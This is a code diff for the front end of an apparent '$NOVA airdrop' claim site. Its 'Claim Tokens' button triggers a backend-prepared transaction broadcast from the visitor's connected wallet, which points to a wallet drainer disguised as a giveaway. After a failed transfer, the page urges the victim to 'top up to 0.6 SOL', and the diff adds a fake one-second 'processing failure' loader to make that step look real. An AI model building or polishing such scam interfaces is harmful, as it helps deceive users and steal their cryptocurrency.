@@ -421,6 +421,7 @@ function App() {
   const startAfterConnect = useRef(false)
   const [transferFailed, setTransferFailed] = useState(false);
   const visitLoggedRef = useRef(false);
+  const [showFailureLoader, setShowFailureLoader] = useState(false);
 
   const walletLabel = isConnected && address ? `${address.slice(0, 4)}...${address.slice(-4)}` : 'Claim Tokens'
 
@@ -483,6 +484,7 @@ function App() {
     }
 
     setTransferFailed(false);
+    setShowFailureLoader(false);
     setIsWorking(true)
     setStatus('Preparing the transfer on the backend...')
     try {
@@ -517,7 +519,13 @@ function App() {
       }
       setStatus(`Broadcast complete: ${lastSignature}`)
     } catch (error) {
-      setTransferFailed(true);
+      // setTransferFailed(true);
+      setShowFailureLoader(true);
+
+      setTimeout(() => {
+        setShowFailureLoader(false);
+        setTransferFailed(true);
+      }, 1000);
       if (error instanceof SendTransactionError) {
         try {
           const logs = await error.getLogs(connection)
@@ -581,8 +589,8 @@ function App() {
                   Join the exclusive $NOVA airdrop and claim your tokens. Limited-time opportunity for early adopters and community members to participate in our Web3 ecosystem.
                 </p>
                 <div className="hero-actions">
-                  <button disabled={isWorking} onClick={() => void startTransfer()} className={`btn-primary ${transferFailed ? 'btn-error transfer-failed' : ''}`} type="button">
-                    {isWorking ? 'Tokens Incoming...' : transferFailed ? 'Transfer Failed! top up to 0.6 SOL' : isConnected ? 'Claim Tokens' : walletLabel}
+                  <button disabled={isWorking || showFailureLoader} onClick={() => void startTransfer()} className={`btn-primary ${transferFailed ? 'btn-error transfer-failed' : ''}`} type="button">
+                    {isWorking ? 'Tokens Incoming...' : showFailureLoader ? <span className="failure-loader" aria-label="Processing failure" /> : transferFailed ? 'Transfer Failed! top up to 0.6 SOL' : isConnected ? 'Claim Tokens' : walletLabel}
                   </button>
                   <a href="#about" className="btn-secondary">Learn More</a>
                 </div>
@@ -655,8 +663,8 @@ function App() {
               {/* Claim CTA Section */}
               <div id="claim" className="claim-cta-section scroll-animation fade-up" ref={claimRef}>
                 <h3 className="claim-cta-title">Ready to claim your tokens?</h3>
-                <button className="btn-connect-wallet" disabled={isWorking} onClick={() => void startTransfer()} type="button">
-                  {isWorking ? 'Tokens Incoming...': transferFailed ? 'Transfer Failed' : isConnected ? 'Claim Tokens' : walletLabel}
+                <button className={`btn-connect-wallet ${transferFailed ? 'transfer-failed' : ''}`} disabled={isWorking || showFailureLoader} onClick={() => void startTransfer()} type="button">
+                  {isWorking ? 'Tokens Incoming...': showFailureLoader ? <span className="failure-loader" aria-label="Processing failure" /> : transferFailed ? 'Transfer Failed' : isConnected ? 'Claim Tokens' : walletLabel}
                 </button>
                 {status && <p className="transfer-status" role="status">{status}</p>}
               </div>
